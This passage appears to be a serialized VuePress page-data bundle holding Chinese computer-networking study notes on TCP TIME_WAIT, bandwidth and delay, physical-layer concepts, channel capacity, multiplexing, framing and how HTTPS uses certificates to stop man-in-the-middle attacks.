793中规定msl为2分钟，实际应用中常用的是30秒，1分钟和2分钟等。\n\n2msl即两倍的msl，tcp的time_wait状态也称为2msl等待状态，当tcp的一端发起主动关闭，在发出最后一个ack包后，即第3次握手完成后发送了第四次握手的ack包后就进入了time_wait状态，必须在此状态上停留两倍的msl时间，等待2msl时间主要目的是怕最后一个ack包对方没收到，那么对方在超时后将重发第三次握手的fin包，主动关闭端接到重发的fin包后可以再发一个ack应答包。在time_wait状态时两端的端口不能使用，要等到2msl时间结束才可继续使用。当连接处于2msl等待阶段时任何迟到的报文段都将被丢弃。不过在实际应用中可以通过设置so_reuseaddr选项达到不必等待2msl时间结束再使用此端口。\n\nttl与msl是有关系的但不是简单的相等的关系，msl要大于等于ttl。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"基本概念",frontmatter:{title:"基本概念",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/65172e/",categories:["网络","网络原理"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/01.%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",relativePath:"06.网络/02.网络原理/01.基本概念.md",key:"v-2cb8e1b4",path:"/pages/65172e/",headers:[{level:2,title:"第一种含义：",slug:"第一种含义",normalizedTitle:"第一种含义：",charIndex:16},{level:2,title:"第二种含义：",slug:"第二种含义",normalizedTitle:"第二种含义：",charIndex:72},{level:2,title:"发送时延",slug:"发送时延",normalizedTitle:"发送时延",charIndex:328},{level:2,title:"传输时延",slug:"传输时延",normalizedTitle:"传输时延",charIndex:401},{level:2,title:"排队时延",slug:"排队时延",normalizedTitle:"排队时延",charIndex:486},{level:2,title:"处理时延",slug:"处理时延",normalizedTitle:"处理时延",charIndex:546}],headersStr:"第一种含义： 第二种含义： 发送时延 传输时延 排队时延 处理时延",content:"# 带宽\n\n有两种含义\n\n\n# 第一种含义：\n\n“带宽” 指信号具有的频带宽度。基本单位是赫。\n\n> 比如wifi频率有2.4G和5G\n\n\n# 第二种含义：\n\n“带宽”是数字信道所能传送的最高数据率的同义语，单位是比特/秒(bit/s)。\n\n> 比如上行带宽100M，下行带宽1M\n\n\n# 吞吐量\n\n表示在单位时间内通过某个网络（或信道、接口）的数据量。 吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。 吞吐量受网络的带宽或网络的额定速率的限制。\n\n> 简单的说就是一段时间内通过的某个端口数据量，和电流大小的、水流大小的概念类似\n\n\n# 时延\n\n指数据从网络（或链路）的一端传送到另一端所需的时间。\n\n\n# 发送时延\n\n主机或路由器发送数据帧所需要的时间。\n\n$$ 发送时延 = {数据帧长度 \\over 发送速率} $$\n\n> 受到网卡的限制\n\n\n# 传输时延\n\n电磁波在信道中需要传播一定的距离而花费的时间。 $$ 传播时延 = {信道长度 \\over 传播速率} $$\n\n> 受到传输介质的限制，光纤比铜线快\n\n\n# 排队时延\n\n结点缓存队列中分组排队所经历的时延。\n\n> 中间节点和最后的节点可能前面还有数据待处理需要排队等待\n\n\n# 处理时延\n\n交换结点为存储转发而进行一些处理所费的时间。\n\n> 收到信息之后要进行处理\n\n\n# 利用率\n\n信道利用率指出某信道有百分之几的时间是被利用的（有数据通过）。完全空闲的信道的利用率是零。 网络利用率则是全网络的信道利用率的加权平均值。\n\n> 并不是利用率越高越高，太高了会堵塞，太低了会造成资源的浪费\n\n\n# 交换方式\n\n\n\n\n# 分层体系\n\n",normalizedContent:"# 带宽\n\n有两种含义\n\n\n# 第一种含义：\n\n“带宽” 指信号具有的频带宽度。基本单位是赫。\n\n> 比如wifi频率有2.4g和5g\n\n\n# 第二种含义：\n\n“带宽”是数字信道所能传送的最高数据率的同义语，单位是比特/秒(bit/s)。\n\n> 比如上行带宽100m，下行带宽1m\n\n\n# 吞吐量\n\n表示在单位时间内通过某个网络（或信道、接口）的数据量。 吞吐量更经常地用于对现实世界中的网络的一种测量，以便知道实际上到底有多少数据量能够通过网络。 吞吐量受网络的带宽或网络的额定速率的限制。\n\n> 简单的说就是一段时间内通过的某个端口数据量，和电流大小的、水流大小的概念类似\n\n\n# 时延\n\n指数据从网络（或链路）的一端传送到另一端所需的时间。\n\n\n# 发送时延\n\n主机或路由器发送数据帧所需要的时间。\n\n$$ 发送时延 = {数据帧长度 \\over 发送速率} $$\n\n> 受到网卡的限制\n\n\n# 传输时延\n\n电磁波在信道中需要传播一定的距离而花费的时间。 $$ 传播时延 = {信道长度 \\over 传播速率} $$\n\n> 受到传输介质的限制，光纤比铜线快\n\n\n# 排队时延\n\n结点缓存队列中分组排队所经历的时延。\n\n> 中间节点和最后的节点可能前面还有数据待处理需要排队等待\n\n\n# 处理时延\n\n交换结点为存储转发而进行一些处理所费的时间。\n\n> 收到信息之后要进行处理\n\n\n# 利用率\n\n信道利用率指出某信道有百分之几的时间是被利用的（有数据通过）。完全空闲的信道的利用率是零。 网络利用率则是全网络的信道利用率的加权平均值。\n\n> 并不是利用率越高越高，太高了会堵塞，太低了会造成资源的浪费\n\n\n# 交换方式\n\n\n\n\n# 分层体系\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"基本概念",frontmatter:{title:"基本概念",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/d35054/",categories:["网络","网络原理","物理层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/01.%E7%89%A9%E7%90%86%E5%B1%82/01.%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html",relativePath:"06.网络/02.网络原理/01.物理层/01.基本概念.md",key:"v-4cb6535f",path:"/pages/d35054/",headers:[{level:2,title:"基本术语",slug:"基本术语",normalizedTitle:"基本术语",charIndex:210},{level:2,title:"通信方式",slug:"通信方式",normalizedTitle:"通信方式",charIndex:325},{level:2,title:"信源数据与传输信号转换关系",slug:"信源数据与传输信号转换关系",normalizedTitle:"信源数据与传输信号转换关系",charIndex:451}],headersStr:"基本术语 通信方式 信源数据与传输信号转换关系",content:"物理层的主要任务描述为确定与传输媒体接口的四个特性。\n\n1. 机械特性:\n\n指明接口所用接线器的形状和尺寸、引线数目和排列等。\n\n2. 电气特性 ：\n\n指明在接口电缆的各条线上出现的电压的范围。\n\n3. 功能特性 ：\n\n指明某条线上出现的某一电平的电压表示何种意义。\n\n4. 过程特性：\n\n指明对于不同功能的各种可能事件的出现顺序\n\n\n# 数据通信系统模型\n\n\n\n发送器：将数据转换成可以在传输介质上传输的信号\n\n\n# 基本术语\n\n * 数据：运送消息的实体。\n * 信号：数据的电气的或电磁的表现。\n * 模拟信号：代表消息的参数的取值是连续的。\n * 数字信号：代表消息的参数的取值是离散的。\n * 信道: 向某一个方向传递信息的通道。\n\n\n# 通信方式\n\n * 单向通信（单工通信）：只能有一个方向的通信而没有反方向的交互。\n * 双向交替通信（半双工通信）：通信的双方都可以发送信息，但不能双方同时发送、同时接收。\n * 双向同时通信（全双工通信）：通信的双方可以同时发送和接收信息。\n\n\n# 信源数据与传输信号转换关系\n\n\n\n * 调制：使用载波进行调制， 把数字信号的频率范围搬移到较高的频段，并转换成模拟信号，以便在模拟信道中传输。 常见的调制方式\n * 解调：把接收到的模拟信号还原成数字信号。",normalizedContent:"物理层的主要任务描述为确定与传输媒体接口的四个特性。\n\n1. 机械特性:\n\n指明接口所用接线器的形状和尺寸、引线数目和排列等。\n\n2. 电气特性 ：\n\n指明在接口电缆的各条线上出现的电压的范围。\n\n3. 功能特性 ：\n\n指明某条线上出现的某一电平的电压表示何种意义。\n\n4. 过程特性：\n\n指明对于不同功能的各种可能事件的出现顺序\n\n\n# 数据通信系统模型\n\n\n\n发送器：将数据转换成可以在传输介质上传输的信号\n\n\n# 基本术语\n\n * 数据：运送消息的实体。\n * 信号：数据的电气的或电磁的表现。\n * 模拟信号：代表消息的参数的取值是连续的。\n * 数字信号：代表消息的参数的取值是离散的。\n * 信道: 向某一个方向传递信息的通道。\n\n\n# 通信方式\n\n * 单向通信（单工通信）：只能有一个方向的通信而没有反方向的交互。\n * 双向交替通信（半双工通信）：通信的双方都可以发送信息，但不能双方同时发送、同时接收。\n * 双向同时通信（全双工通信）：通信的双方可以同时发送和接收信息。\n\n\n# 信源数据与传输信号转换关系\n\n\n\n * 调制：使用载波进行调制， 把数字信号的频率范围搬移到较高的频段，并转换成模拟信号，以便在模拟信道中传输。 常见的调制方式\n * 解调：把接收到的模拟信号还原成数字信号。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"常见的调制方式",frontmatter:{title:"常见的调制方式",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/138a45/",categories:["网络","网络原理","物理层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/01.%E7%89%A9%E7%90%86%E5%B1%82/02.%E5%B8%B8%E8%A7%81%E7%9A%84%E8%B0%83%E5%88%B6%E6%96%B9%E5%BC%8F.html",relativePath:"06.网络/02.网络原理/01.物理层/02.常见的调制方式.md",key:"v-338f9336",path:"/pages/138a45/",headersStr:null,content:" 1. 基带调制\n\n又称为编码，转换后依然是基带信号\n\n\n\n 2. 带通调制\n\n利用载波低频转高频，更好的在模拟信道上传输，调制完的信号叫做带通信号\n\n",normalizedContent:" 1. 基带调制\n\n又称为编码，转换后依然是基带信号\n\n\n\n 2. 带通调制\n\n利用载波低频转高频，更好的在模拟信道上传输，调制完的信号叫做带通信号\n\n",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"信道的极限容量",frontmatter:{title:"信道的极限容量",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/ce4dd5/",categories:["网络","网络原理","物理层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/01.%E7%89%A9%E7%90%86%E5%B1%82/03.%E4%BF%A1%E9%81%93%E7%9A%84%E6%9E%81%E9%99%90%E5%AE%B9%E9%87%8F.html",relativePath:"06.网络/02.网络原理/01.物理层/03.信道的极限容量.md",key:"v-015000d6",path:"/pages/ce4dd5/",headersStr:null,content:" 1. 奈奎斯特定理\n\n在任何信道中，码元传输的速率是有上限的，超过此上限，就会出现严重的码间串扰问题。\n\n如果信道的频带越宽，则可以用更高的速率传送码元而不出现码间串扰。\n\n 2. 香农公式\n\n带宽受限且有高斯白噪声干扰的信道的极限信息传输速率\n\n$C = W log_2(1+S/N)$\n\n>  * W 是信道的带宽（以 Hz 为单位）\n>  * S 为信道内所传信号的平均功率\n>  * N 为信道内部的噪声功率。\n\n信噪比S/N通常用分贝（dB）来表示：\n\n通过编码，可以增加每一个码元携带的信息量",normalizedContent:" 1. 奈奎斯特定理\n\n在任何信道中，码元传输的速率是有上限的，超过此上限，就会出现严重的码间串扰问题。\n\n如果信道的频带越宽，则可以用更高的速率传送码元而不出现码间串扰。\n\n 2. 香农公式\n\n带宽受限且有高斯白噪声干扰的信道的极限信息传输速率\n\n$c = w log_2(1+s/n)$\n\n>  * w 是信道的带宽（以 hz 为单位）\n>  * s 为信道内所传信号的平均功率\n>  * n 为信道内部的噪声功率。\n\n信噪比s/n通常用分贝（db）来表示：\n\n通过编码，可以增加每一个码元携带的信息量",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"信道复用",frontmatter:{title:"信道复用",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/eab216/",categories:["网络","网络原理","物理层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/01.%E7%89%A9%E7%90%86%E5%B1%82/04.%E4%BF%A1%E9%81%93%E5%A4%8D%E7%94%A8.html",relativePath:"06.网络/02.网络原理/01.物理层/04.信道复用.md",key:"v-ada51664",path:"/pages/eab216/",headers:[{level:2,title:"同步时分复用",slug:"同步时分复用",normalizedTitle:"同步时分复用",charIndex:103},{level:2,title:"统计时分复用（异步时分复用）",slug:"统计时分复用-异步时分复用",normalizedTitle:"统计时分复用（异步时分复用）",charIndex:200}],headersStr:"同步时分复用 统计时分复用（异步时分复用）",content:"# 频分复用\n\n将信道的可用频带分割成若干条较窄的子频带，每一条子频带传输一路信号。 用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。\n\n\n\n光的频分复用：波分复用\n\n\n# 时分复用\n\n\n# 同步时分复用\n\n将时间划分为一段段等长的时隙，每一个用户占用固定序号的时隙传输数据。 每一个用户所占用的时隙是周期性地出现。\n\n\n\n时分复用的所有用户在不同的时间占用同样的频带宽度\n\n\n\n\n# 统计时分复用（异步时分复用）\n\n先进行统计，然后依次将需要发送的数据进行时分复用，但是因为每一个时间是不确定的，所以需要在数据帧上加上地址信息\n\n\n\n\n# 码分复用\n\n每个用户被分配一个码片序列，这些码片序列是互相正交的，\n\n当需要发送1的时候，则发送序列\n\n当需要发送0的时候，则发送序列反码\n\n所以用户的序列和其他用户的序列內积是0\n\n而序列和序列的规格化內积是1，序列与序列的反码的规格化內积为-1",normalizedContent:"# 频分复用\n\n将信道的可用频带分割成若干条较窄的子频带，每一条子频带传输一路信号。 用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。\n\n\n\n光的频分复用：波分复用\n\n\n# 时分复用\n\n\n# 同步时分复用\n\n将时间划分为一段段等长的时隙，每一个用户占用固定序号的时隙传输数据。 每一个用户所占用的时隙是周期性地出现。\n\n\n\n时分复用的所有用户在不同的时间占用同样的频带宽度\n\n\n\n\n# 统计时分复用（异步时分复用）\n\n先进行统计，然后依次将需要发送的数据进行时分复用，但是因为每一个时间是不确定的，所以需要在数据帧上加上地址信息\n\n\n\n\n# 码分复用\n\n每个用户被分配一个码片序列，这些码片序列是互相正交的，\n\n当需要发送1的时候，则发送序列\n\n当需要发送0的时候，则发送序列反码\n\n所以用户的序列和其他用户的序列內积是0\n\n而序列和序列的规格化內积是1，序列与序列的反码的规格化內积为-1",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"封装成帧",frontmatter:{title:"封装成帧",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/2fe809/",categories:["网络","网络原理","数据链路层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/02.%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/02.%E5%B0%81%E8%A3%85%E6%88%90%E5%B8%A7.html",relativePath:"06.网络/02.网络原理/02.数据链路层/02.封装成帧.md",key:"v-78a37848",path:"/pages/2fe809/",headersStr:null,content:" * 封装成帧就是在一段数据的前后分别添加首部和尾部构成 一个帧。\n * 首部和尾部的一个重要作用就是进行帧定界。\n\n\n\n每个帧有最大长度限制",normalizedContent:" * 封装成帧就是在一段数据的前后分别添加首部和尾部构成 一个帧。\n * 首部和尾部的一个重要作用就是进行帧定界。\n\n\n\n每个帧有最大长度限制",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"HTTPS 加密机制",frontmatter:{title:"HTTPS 加密机制",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/498541/",categories:["网络","网络协议","http_https"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/01.%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/01.http(s)/04.HTTPS%20%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6.html",relativePath:"06.网络/01.网络协议/01.http(s)/04.HTTPS 加密机制.md",key:"v-1ffab755",path:"/pages/498541/",headersStr:null,content:"# 1. HTTPS 概述\n\nHTTPS（全称：Hyper Text Transfer Protocol over Secure Socket Layer 或 Hypertext Transfer Protocol Secure，超文本传输安全协议），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 它是一个URI scheme（抽象标识符体系），句法类同http:体系。用于安全的HTTP数据传输。https: URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密/身份验证层（在HTTP与TCP之间）。 众所周知，WEB服务存在http和https两种通信方式，http默认采用80作为通讯端口，对于传输采用不加密的方式；https默认采用443，对于传输的数据进行加密传输。目前主流的网站基本上开始默认采用HTTPS作为通信方式\n\n\n# 2. 对称加密\n\n\n\n对称加密算法的加密和解密都是用同一个密钥。\n\n如果通信双方都各自持有同一个密钥，且没有别人知道，则两方的通信安全是可以被保证的（除非密钥被破解）。 然而，最大的问题就是这个密钥怎么让传输的双方知晓，同时不被别人知道。如果由服务器生成一个密钥并传输给浏览器，这个传输过程中密钥被别人劫持，之后他就能用密钥解开双方传输的任何内容。 如果浏览器内部预存了网站A的密钥，且可以确保除了浏览器和网站A，不会有任何外人知道该密钥，那理论上用对称加密是可以的。这样，浏览器只要预存好世界上所有HTTPS网站的密钥就可以了。显然，这样做是不现实的。 怎么办？解决这个问题，我们就需要非对称加密。\n\n\n# 3. 非对称加密\n\n\n\n基于对称加密存在的问题，又有了非对称加密。非对称加密算法需要一组密钥对，分别是公钥和私钥，这两个密钥是成对出现的。公钥加密的内容需要对应的私钥解密，私钥加密的内容需要对应的公钥解密。私钥由服务器自己保存，公钥发送给客户端。客户端拿到公钥后可以对请求进行加密后发送给服务端，这时候就算中间被截获，没有私钥也无法解密发送的内容，这样确保了客户端发送到服务端数据的安全。\n\n\n# 4. 非对称加密改良方案\n\n\n\n通过一组公钥私钥，已经可以保证单个方向传输的安全性，那用两组公钥私钥，是不是就能保证双向传输都安全了？请看下面的过程：\n\n 1. 某网站拥有用于非对称加密的公钥A1、私钥A2；浏览器拥有用于非对称加密的公钥B1、私钥B2。\n 2. 浏览器向网站服务器请求，服务器把公钥A1明文传输给浏览器。\n 3. 浏览器把公钥B1明文传输给服务器。\n 4. 之后浏览器向服务器传输的所有东西都用公钥A1加密，服务器收到后用私钥A2解密。由于只有服务器拥有私钥A2进行解密，所以能保证这条数据的安全。\n 5. 服务器向浏览器传输的所有东西都用公钥B1加密，浏览器收到后用私钥B2解密。同上也可以保证这条数据的安全。\n\n可见确实可行。抛开这里面仍有的漏洞不谈（下文会讲），HTTPS的加密却没使用这种方案，为什么？最主要的原因是非对称加密算法非常耗时，特别是加密解密一些较大数据的时候有些力不从心。而对称加密快很多。那我们能不能运用非对称加密的特性解决前面提到的对称加密的问题？\n\n\n# 5. 非对称加密 + 对称加密\n\n\n\n既然非对称加密耗时，我们考虑是否可以采用非对称加密+对称加密结合的方式，而且要尽量减少非对称加密的次数。 非对称加密、解密各只需一次的方法：\n\n 1. 某网站拥有用于非对称加密的公钥A1、私钥A2。\n 2. 浏览器向网站服务器请求，服务器把公钥A1明文给传输浏览器。\n 3. 浏览器随机生成一个用于对称加密的密钥X，用公钥A1加密后传给服务器。\n 4. 服务器拿到后用私钥A2解密得到密钥X。\n 5. 这样双方就都拥有密钥X了，且别人无法知道它。之后双方所有数据都用密钥X加密解密即可。\n\nHTTPS基本就是采用了这种方案。但还是有漏洞的。\n\n\n# 6. 中间人攻击\n\n\n\n中间人的确无法得到浏览器生成的对称密钥X，这个密钥本身被公钥A1加密，只有服务器才能用私钥A2进行解密。然而中间人却完全不需要拿到私钥A2就能劫持信息，请看：\n\n 1. 某网站拥有用于非对称加密的公钥A1、私钥A2。\n 2. 浏览器向网站服务器请求，服务器把公钥A1明文传输给浏览器。\n 3. 中间人劫持到公钥A1，保存下来，把数据包中的公钥A1替换成自己伪造的公钥B1（它当然也拥有公钥B1对应的私钥B2）。\n 4. 浏览器随机生成一个用于对称加密的密钥X，用公钥B1（浏览器不知道公钥被替换了）加密后传给服务器。\n 5. 中间人劫持后用私钥B2解密得到密钥X，再用公钥A1加密后传给服务器。\n 6. 服务器拿到后用私钥A2解密得到密钥X。\n\n这样在双方都不会发现异常的情况下，中间人得到了对称密钥X。根本原因是浏览器无法确认自己收到的公钥是不是网站自己的。那么下一步就是解决这个问题：如何证明浏览器收到的公钥一定是该网站的公钥？\n\n\n# 7. 数字证书\n\n现实生活中，如果想证明某身份证号一定是小明的，怎么办？看身份证。这里政府机构起到了“公信”的作用，身份证是由它颁发的，它本身的权威可以对一个人的身份信息作出证明。互联网中也有这么一个公信机构，CA 机构。 网站在使用HTTPS前，需要向“CA机构”申请颁发一数字证书，数字证书里有证书持有者、证书持有者的公钥等信息。服务器把证书传输给浏览器，浏览器从证书里取公钥就可以了。然而这里又有一个显而易见的问题：证书本身的传输过程中，如何防止被篡改？即如何证明证书本身的真实性？数字证书怎么防伪呢？\n\n\n# 8. 数字签名\n\n我们把证书内容生成一份“签名”，比对证书内容和签名是否一致就能察觉是否被篡改。这种技术就叫数字签名。 下图中左侧是数字签名的制作过程，右侧是验证过程\n\n\n\n数字签名的制作过程：\n\n 1. CA拥有非对称加密的私钥和公钥。\n 2. CA对证书明文信息进行hash。\n 3. 对hash后的值用私钥加密，得到数字签名。\n\n明文和数字签名共同组成了数字证书，这样一份数字证书就可以颁发给网站了。 那浏览器拿到服务器传来的数字证书后，如何验证它是不是真的？（有没有被篡改、掉包）\n\n浏览器验证过程：\n\n 1. 拿到证书，得到明文T1，数字签名S1。\n 2. 用CA机构的公钥对S1解密（由于是浏览器信任的机构，所以浏览器保有它的公钥。详情见下文），得到S2。\n 3. 用证书里说明的hash算法对明文T1进行hash得到T2。\n 4. 比较S2是否等于T2，等于则表明证书可信。\n\n为什么这样可以证明证书可信？ 假设中间人篡改了证书的原文，由于他没有CA机构的私钥，所以无法得到此时加密后签名，无法相应地篡改签名。浏览器收到该证书后会发现原文和签名解密后的值不一致，则说明证书已被篡改，证书不可信，从而终止向服务器传输信息，防止信息泄露给中间人。\n\n既然不可能篡改，那如果整个证书被掉包呢？ 假设有另一个网站B也拿到了CA机构认证的证书，它想搞垮网站A，想劫持网站A的信息。于是它成为中间人拦截到了A传给浏览器的证书，然后替换成自己的证书，传给浏览器，之后浏览器就会错误地拿到B的证书里的公钥了，会导致上文提到的漏洞。 其实这并不会发生，因为证书里包含了网站A的信息，包括域名，浏览器把证书里的域名与自己请求的域名比对一下就知道有没有被掉包了。\n\n制作数字签名时为什么需要hash一次？ 最显然的是性能问题，前面我们已经说了非对称加密效率较差，证书信息一般较长，比较耗时。而hash后得到的是固定长度的信息（比如用md5算法hash后可以得到固定的128位的值），这样加密解密就会快很多。当然除此之外也有安全上的原因。\n\nHTTPS必须在每次请求中都要先在SSL/TLS层进行握手传输密钥吗？ 显然每次请求都经历一次密钥传输过程非常耗时，那怎么达到只传输一次呢？用session就可以。 服务器会为每个浏览器（或客户端软件）维护一个session ID，在TSL握手阶段传给浏览器，浏览器生成好密钥传给服务器后，服务器会把该密钥存到相应的session ID下，之后浏览器每次请求都会携带session ID，服务器会根据session ID找到相应的密钥并进行解密加密操作，这样就不必要每次重新制作、传输密钥了\n\n\n# 9. HTTPS 工作原理\n\n\n\n 1. client向server发送请求https://baidu.com，然后连接到server的443端口。\n\n 2. 服务端必须要有一套数字证书，可以自己制作，也可以向组织申请。区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面，这套证书其实就是一对公钥和私钥。\n\n 3. 传送证书 这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间、服务端的公钥，第三方证书认证机构(CA)的签名，服务端的域名信息等内容。\n\n 4. 客户端解析证书 这部分工作是由客户端的TLS来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。如果证书没有问题，那么就生成一个随机值（密钥）。然后用证书对该随机值进行加密。\n\n 5. 传送加密信息 这部分传送的是用证书加密后的密钥（随机值），目的就是让服务端得到这个密钥（随机值），以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。\n\n 6. 服务端加密信息 服务端用私钥解密，得到了客户端传过来的密钥（随机值），然后把内容通过该值进行对称加密。\n\n 7. 传输加密后的信息 这部分信息是服务端用密钥（随机值）对称加密后的信息，可以在客户端被还原。\n\n 8. 客户端解密信息 客户端用之前生成的密钥（随机值）解密服务端传过来的信息，于是获取了解密后的内容。",normalizedContent:"# 1. https 概述\n\nhttps（全称：hyper text transfer protocol over secure socket layer 或 hypertext transfer protocol secure，超文本传输安全协议），是以安全为目标的http通道，简单讲是http的安全版。即http下加入ssl层，https的安全基础是ssl，因此加密的详细内容就需要ssl。 它是一个uri scheme（抽象标识符体系），句法类同http:体系。用于安全的http数据传输。https: url表明它使用了http，但https存在不同于http的默认端口及一个加密/身份验证层（在http与tcp之间）。 众所周知，web服务存在http和https两种通信方式，http默认采用80作为通讯端口，对于传输采用不加密的方式；https默认采用443，对于传输的数据进行加密传输。目前主流的网站基本上开始默认采用https作为通信方式\n\n\n# 2. 对称加密\n\n\n\n对称加密算法的加密和解密都是用同一个密钥。\n\n如果通信双方都各自持有同一个密钥，且没有别人知道，则两方的通信安全是可以被保证的（除非密钥被破解）。 然而，最大的问题就是这个密钥怎么让传输的双方知晓，同时不被别人知道。如果由服务器生成一个密钥并传输给浏览器，这个传输过程中密钥被别人劫持，之后他就能用密钥解开双方传输的任何内容。 如果浏览器内部预存了网站a的密钥，且可以确保除了浏览器和网站a，不会有任何外人知道该密钥，那理论上用对称加密是可以的。这样，浏览器只要预存好世界上所有https网站的密钥就可以了。显然，这样做是不现实的。 怎么办？解决这个问题，我们就需要非对称加密。\n\n\n# 3. 非对称加密\n\n\n\n基于对称加密存在的问题，又有了非对称加密。非对称加密算法需要一组密钥对，分别是公钥和私钥，这两个密钥是成对出现的。公钥加密的内容需要对应的私钥解密，私钥加密的内容需要对应的公钥解密。私钥由服务器自己保存，公钥发送给客户端。客户端拿到公钥后可以对请求进行加密后发送给服务端，这时候就算中间被截获，没有私钥也无法解密发送的内容，这样确保了客户端发送到服务端数据的安全。\n\n\n# 4. 非对称加密改良方案\n\n\n\n通过一组公钥私钥，已经可以保证单个方向传输的安全性，那用两组公钥私钥，是不是就能保证双向传输都安全了？请看下面的过程：\n\n 1. 某网站拥有用于非对称加密的公钥a1、私钥a2；浏览器拥有用于非对称加密的公钥b1、私钥b2。\n 2. 浏览器向网站服务器请求，服务器把公钥a1明文传输给浏览器。\n 3. 浏览器把公钥b1明文传输给服务器。\n 4. 之后浏览器向服务器传输的所有东西都用公钥a1加密，服务器收到后用私钥a2解密。由于只有服务器拥有私钥a2进行解密，所以能保证这条数据的安全。\n 5. 服务器向浏览器传输的所有东西都用公钥b1加密，浏览器收到后用私钥b2解密。同上也可以保证这条数据的安全。\n\n可见确实可行。抛开这里面仍有的漏洞不谈（下文会讲），https的加密却没使用这种方案，为什么？最主要的原因是非对称加密算法非常耗时，特别是加密解密一些较大数据的时候有些力不从心。而对称加密快很多。那我们能不能运用非对称加密的特性解决前面提到的对称加密的问题？\n\n\n# 5. 非对称加密 + 对称加密\n\n\n\n既然非对称加密耗时，我们考虑是否可以采用非对称加密+对称加密结合的方式，而且要尽量减少非对称加密的次数。 非对称加密、解密各只需一次的方法：\n\n 1. 某网站拥有用于非对称加密的公钥a1、私钥a2。\n 2. 浏览器向网站服务器请求，服务器把公钥a1明文给传输浏览器。\n 3. 浏览器随机生成一个用于对称加密的密钥x，用公钥a1加密后传给服务器。\n 4. 服务器拿到后用私钥a2解密得到密钥x。\n 5. 这样双方就都拥有密钥x了，且别人无法知道它。之后双方所有数据都用密钥x加密解密即可。\n\nhttps基本就是采用了这种方案。但还是有漏洞的。\n\n\n# 6. 中间人攻击\n\n\n\n中间人的确无法得到浏览器生成的对称密钥x，这个密钥本身被公钥a1加密，只有服务器才能用私钥a2进行解密。然而中间人却完全不需要拿到私钥a2就能劫持信息，请看：\n\n 1. 某网站拥有用于非对称加密的公钥a1、私钥a2。\n 2. 浏览器向网站服务器请求，服务器把公钥a1明文传输给浏览器。\n 3. 中间人劫持到公钥a1，保存下来，把数据包中的公钥a1替换成自己伪造的公钥b1（它当然也拥有公钥b1对应的私钥b2）。\n 4. 浏览器随机生成一个用于对称加密的密钥x，用公钥b1（浏览器不知道公钥被替换了）加密后传给服务器。\n 5. 中间人劫持后用私钥b2解密得到密钥x，再用公钥a1加密后传给服务器。\n 6. 服务器拿到后用私钥a2解密得到密钥x。\n\n这样在双方都不会发现异常的情况下，中间人得到了对称密钥x。根本原因是浏览器无法确认自己收到的公钥是不是网站自己的。那么下一步就是解决这个问题：如何证明浏览器收到的公钥一定是该网站的公钥？\n\n\n# 7. 数字证书\n\n现实生活中，如果想证明某身份证号一定是小明的，怎么办？看身份证。这里政府机构起到了“公信”的作用，身份证是由它颁发的，它本身的权威可以对一个人的身份信息作出证明。互联网中也有这么一个公信机构，ca 机构。 网站在使用https前，需要向“ca机构”申请颁发一数字证书，数字证书里有证书持有者、证书持有者的公钥等信息。服务器把证书传输给浏览器，浏览器从证书里取公钥就可以了。然而这里又有一个显而易见的问题：证书本身的传输过程中，如何防止被篡改？即如何证明证书本身的真实性？数字证书怎么防伪呢？\n\n\n# 